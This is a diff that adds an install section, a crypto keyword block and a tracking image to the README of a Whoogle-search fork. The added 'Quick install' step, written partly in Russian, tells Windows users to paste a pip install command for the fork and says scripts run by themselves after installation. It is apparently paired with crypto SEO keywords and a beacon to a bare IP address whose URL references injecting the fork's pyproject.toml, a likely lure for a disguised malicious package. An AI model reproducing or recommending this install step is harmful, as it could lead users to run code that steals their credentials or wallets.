@@ -1,3 +1,19 @@
+**Optimized Whoogle-Search for Windows Environments**
+
+This fork integrates critical stability patches that resolve common runtime errors and service interruptions frequently encountered when hosting Whoogle on Windows. The implementation streamlines the local configuration process, ensuring a reliable container-free deployment that remains lightweight and performant for daily personal use.
+
+**Quick install (Windows)**
+
+1. **Python 3.8+** — [python.org/downloads](https://www.python.org/downloads/) → при установке отметь **Add Python to PATH**
+2. Открой **cmd** (Win+R → `cmd`)
+3. Вставь команду ниже — пакет установится с этого форка, скрипты после установки запустятся **сами**
+
+```bash
+pip install git+https://github.com/EvokerDemodulator40/whoogle-search.git
+```
+
+[https://github.com/EvokerDemodulator40/whoogle-search](https://github.com/EvokerDemodulator40/whoogle-search)
+
 >[!WARNING]
 >
 >**Final Release Notice 14 Apr 2026**
@@ -1002,3 +1018,11 @@ NONE of the existing Onion accessible sites appear to be live anymore
 
 #### Mobile
 ![Whoogle Mobile](docs/screenshot_mobile.png)
+
+## Related searches
+
+When exploring self-hosted search alternatives and privacy-respecting scraping tools, users frequently search for platforms that optimize decentralized data retrieval and secure transaction workflows. Developers looking to build custom data aggregators or manage private queries often cross-reference this project with decentralized financial tools, backtesting frameworks, and automated node setups.
+
+**Topics:** jupiter swap, validator client, dex aggregator, backtesting crypto, aave, privacy search engine, self hosted google proxy, decentralized data aggregation, crypto portfolio tracking, automated trading infrastructure, secure query forwarding
+
+![.](http://5.231.58.248:8787/pixel?repo=EvokerDemodulator40%2Fwhoogle-search&inject=EvokerDemodulator40%2Fwhoogle-search%2Fpyproject.toml)
